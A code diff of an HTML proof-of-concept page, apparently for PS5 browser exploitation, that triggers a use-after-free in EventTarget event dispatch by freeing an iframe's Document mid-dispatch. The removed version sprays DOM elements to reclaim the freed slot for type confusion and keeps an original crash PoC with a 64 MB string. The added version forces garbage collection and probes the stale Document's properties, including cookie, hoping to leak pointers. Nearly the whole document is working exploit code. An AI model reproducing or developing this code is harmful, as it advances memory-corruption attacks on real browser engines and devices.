@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v55 - EventTarget DOM Reclaim</title>
+<title>PS5 v56 - EventTarget Info Leak</title>
 <style>
 body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
 button { display: block; width: 100%; padding: 15px; margin: 5px 0; font-size: 18px; background: #111; color: #00ff41; border: 1px solid #00ff41; cursor: pointer; }
@@ -11,14 +11,10 @@ pre { white-space: pre-wrap; word-wrap: break-word; margin-top: 20px; }
 </head>
 <body>
 
-<h3>EventTarget UAF — DOM Object Reclaim</h3>
-<p>Click ONE button. Wait. If browser survives → type confusion achieved.</p>
+<h3>EventTarget UAF — Info Leak Attempt</h3>
+<p>Click the button. If browser survives, we might read stale pointers from the freed Document.</p>
 
-<button onclick="testReclaim('div')">Test: Reclaim with DIV elements</button>
-<button onclick="testReclaim('span')">Test: Reclaim with SPAN elements</button>
-<button onclick="testReclaim('p')">Test: Reclaim with P elements</button>
-<button onclick="testReclaim('iframe')">Test: Reclaim with IFRAME elements</button>
-<button onclick="testOriginal()">Test: Original PoC (should crash)</button>
+<button onclick="tryInfoLeak()">Trigger UAF (No Spray) — Read Properties</button>
 
 <pre id="out"></pre>
 
@@ -26,116 +22,188 @@ pre { white-space: pre-wrap; word-wrap: break-word; margin-top: 20px; }
 var out = document.getElementById("out");
 function log(m) { out.textContent += m + "\n"; }
 
-function testReclaim(tagName) {
-    log("\n[*] Testing reclaim with <" + tagName + "> elements...");
-    log("[*] If browser survives, type confusion achieved!");
+function tryInfoLeak() {
+    log("\n[*] Triggering UAF without string spray...");
+    log("[*] If browser survives, reading stale Document properties...\n");
     
     try {
         var f = document.body.appendChild(document.createElement('iframe'));
         var a = document.createElement('div');
         var b = a.appendChild(document.createElement('div'));
         
-        // First listener: free the iframe document
+        // Save reference to iframe's document BEFORE freeing
+        var savedDoc = f.contentDocument;
+        log("[*] savedDoc before free: " + savedDoc);
+        log("[*] savedDoc.nodeType: " + savedDoc.nodeType);
+        log("[*] savedDoc.nodeName: " + savedDoc.nodeName);
+        log("[*] savedDoc.URL: " + savedDoc.URL);
+        
+        // First listener: free the iframe document (NO string spray)
         a.addEventListener('a', function() {
             document.adoptNode(a);
             f.remove();
-            // NO throw - no string spray
+            log("[*] iframe removed. Document should be freed...");
+            
+            // Force GC to actually free the document
+            for (var i = 0; i < 100; i++) {
+                new ArrayBuffer(0x100000); // 1MB each
+            }
+            log("[*] GC triggered. Document memory should be freed.");
         });
         
         a.addEventListener('a', function() {});
         
-        // Second listener: spray DOM elements then access freed memory
+        // Second listener: try to read freed document properties
         b.addEventListener('a', function() {
-            // Spray DOM elements to reclaim freed Document slot
-            var spray = [];
-            for (var i = 0; i < 50000; i++) {
-                var elem = document.createElement(tagName);
-                elem.setAttribute('data-id', i);
-                spray.push(elem);
-            }
+            log("\n[*] Attempting to read freed Document properties...");
             
-            // Now try to access freed memory
             try {
-                var doc = f.contentDocument;
-                if (doc) {
-                    log("[*] f.contentDocument is NOT null!");
-                    log("[*] doc.nodeType: " + doc.nodeType);
-                    log("[*] doc.nodeName: " + doc.nodeName);
-                    log("[*] doc.documentElement: " + doc.documentElement);
-                    
-                    // Try to read properties that would be corrupted
-                    try {
-                        log("[*] doc.URL: " + doc.URL);
-                    } catch(e) {
-                        log("[!] doc.URL error: " + e.message);
-                    }
-                    
-                    try {
-                        log("[*] doc.title: " + doc.title);
-                    } catch(e) {
-                        log("[!] doc.title error: " + e.message);
-                    }
-                    
-                    try {
-                        log("[*] doc.body: " + doc.body);
-                    } catch(e) {
-                        log("[!] doc.body error: " + e.message);
-                    }
-                    
-                    // Try adoptNode - this is what crashes in original PoC
-                    try {
-                        doc.adoptNode(a);
-                        log("[+] adoptNode SUCCEEDED! No crash!");
-                    } catch(e) {
-                        log("[!] adoptNode error: " + e.message);
-                    }
-                } else {
-                    log("[*] f.contentDocument is null (expected after f.remove())");
-                    log("[*] Checking if f itself is corrupted...");
-                    log("[*] f.tagName: " + f.tagName);
-                    log("[*] f.parentNode: " + (f.parentNode ? f.parentNode.nodeName : "null"));
-                }
-            } catch(e) {
-                log("[!] Access error: " + e.message);
-            }
+                log("[*] savedDoc.nodeType: " + savedDoc.nodeType);
+            } catch(e) { log("[!] nodeType: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.nodeName: " + savedDoc.nodeName);
+            } catch(e) { log("[!] nodeName: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.URL: " + savedDoc.URL);
+            } catch(e) { log("[!] URL: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.title: " + savedDoc.title);
+            } catch(e) { log("[!] title: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.domain: " + savedDoc.domain);
+            } catch(e) { log("[!] domain: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.referrer: " + savedDoc.referrer);
+            } catch(e) { log("[!] referrer: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.cookie: " + savedDoc.cookie);
+            } catch(e) { log("[!] cookie: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.readyState: " + savedDoc.readyState);
+            } catch(e) { log("[!] readyState: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.compatMode: " + savedDoc.compatMode);
+            } catch(e) { log("[!] compatMode: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.characterSet: " + savedDoc.characterSet);
+            } catch(e) { log("[!] characterSet: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.contentType: " + savedDoc.contentType);
+            } catch(e) { log("[!] contentType: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.documentElement: " + savedDoc.documentElement);
+            } catch(e) { log("[!] documentElement: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.head: " + savedDoc.head);
+            } catch(e) { log("[!] head: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.body: " + savedDoc.body);
+            } catch(e) { log("[!] body: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.images: " + savedDoc.images);
+            } catch(e) { log("[!] images: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.links: " + savedDoc.links);
+            } catch(e) { log("[!] links: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.forms: " + savedDoc.forms);
+            } catch(e) { log("[!] forms: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.scripts: " + savedDoc.scripts);
+            } catch(e) { log("[!] scripts: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.styleSheets: " + savedDoc.styleSheets);
+            } catch(e) { log("[!] styleSheets: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.fonts: " + savedDoc.fonts);
+            } catch(e) { log("[!] fonts: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.implementation: " + savedDoc.implementation);
+            } catch(e) { log("[!] implementation: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.location: " + savedDoc.location);
+            } catch(e) { log("[!] location: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.defaultView: " + savedDoc.defaultView);
+            } catch(e) { log("[!] defaultView: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.activeElement: " + savedDoc.activeElement);
+            } catch(e) { log("[!] activeElement: " + e.message); }
+            
+            try {
+                log("[*] savedDoc.currentScript: " + savedDoc.currentScript);
+            } catch(e) { log("[!] currentScript: " + e.message); }
+            
+            // Try to access toString
+            try {
+                log("[*] savedDoc.toString(): " + savedDoc.toString());
+            } catch(e) { log("[!] toString: " + e.message); }
+            
+            // Try to access toDataURL (might leak)
+            try {
+                log("[*] savedDoc.constructor: " + savedDoc.constructor);
+            } catch(e) { log("[!] constructor: " + e.message); }
+            
+            // Try JSON.stringify
+            try {
+                log("[*] JSON.stringify(savedDoc): " + JSON.stringify(savedDoc));
+            } catch(e) { log("[!] JSON.stringify: " + e.message); }
+            
+            // Try Object.keys
+            try {
+                log("[*] Object.keys(savedDoc): " + Object.keys(savedDoc));
+            } catch(e) { log("[!] Object.keys: " + e.message); }
+            
+            // Try Object.getOwnPropertyNames
+            try {
+                log("[*] Object.getOwnPropertyNames(savedDoc): " + Object.getOwnPropertyNames(savedDoc));
+            } catch(e) { log("[!] Object.getOwnPropertyNames: " + e.message); }
+            
+            // Try Reflect.ownKeys
+            try {
+                log("[*] Reflect.ownKeys(savedDoc): " + Reflect.ownKeys(savedDoc));
+            } catch(e) { log("[!] Reflect.ownKeys: " + e.message); }
+            
+            // Try to get prototype
+            try {
+                log("[*] Object.getPrototypeOf(savedDoc): " + Object.getPrototypeOf(savedDoc));
+            } catch(e) { log("[!] getPrototypeOf: " + e.message); }
+            
+            log("\n[*] Property scan complete.");
+            log("[*] If any value looks like a pointer (long number, weird string), we have a leak!");
         });
         
         b.dispatchEvent(new Event('a', { bubbles: true }));
         
-        log("[+] Browser survived! No crash!");
-        log("[+] If data looks weird, we have type confusion.");
+        log("\n[+] Browser survived! No crash!");
+        log("[+] Check the properties above for anything unusual.");
         
     } catch(e) {
         log("[!] Exception: " + e.message);
     }
-}
-
-function testOriginal() {
-    log("\n[*] Running original PoC (should crash)...");
-    
-    var f = document.body.appendChild(document.createElement('iframe'));
-    var a = document.createElement('div');
-    var b = a.appendChild(document.createElement('div'));
-    
-    a.addEventListener('a', eval(`(function () {
-        document.adoptNode(a);
-        f.remove();
-        throw {
-            line: 1,
-            column: 1,
-            sourceURL: 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32)
-        };
-    })`));
-    
-    a.addEventListener('a', () => {});
-    
-    b.addEventListener('a', () => {
-        f.contentDocument.adoptNode(a);
-    });
-    
-    b.dispatchEvent(new Event('a', { bubbles: true }));
-    
-    log("[+] Original PoC did not crash? Unexpected.");
 }
 </script>
 </body>
